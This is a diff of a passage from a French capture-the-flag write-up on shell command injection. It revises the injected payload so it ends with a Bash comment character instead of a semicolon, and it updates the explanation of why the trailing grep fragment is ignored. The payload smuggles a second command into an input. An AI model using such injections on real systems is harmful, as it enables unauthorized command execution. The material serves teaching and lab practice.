@@ -29,16 +29,16 @@ Toutefois, pour détourner cette commande, on doit d'abord s'assurer que les bou
 Voici donc notre attaque finale:
 
 ```
-'; cat flag ;
+'; cat flag #
 ```
 
 Ce qui donnera la commande suivante:
 
 ```
-echo ''; cat flag ;' | grep -oiP 'FLAG-[abcdef0-9]+'
+echo ''; cat flag #' | grep -oiP 'FLAG-[abcdef0-9]+'
 ```
 
-> Le dernier morceau de commande (`' | grep -oiP 'FLAG-[abcdef0-9]+'`) n'est pas valide, mais ce n'est pas grave puisqu'on termine notre propre commande avec `;`. On peut donc être certain qu'elle sera exécutée.
+> Le dernier morceau de commande (`#' | grep -oiP 'FLAG-[abcdef0-9]+'`) est interprété par Bash comme un commentaire (donc ignoré), puisqu'il commence par `#`.
 
 Avec cette attaque, le programme sort le résultat suivant:
 
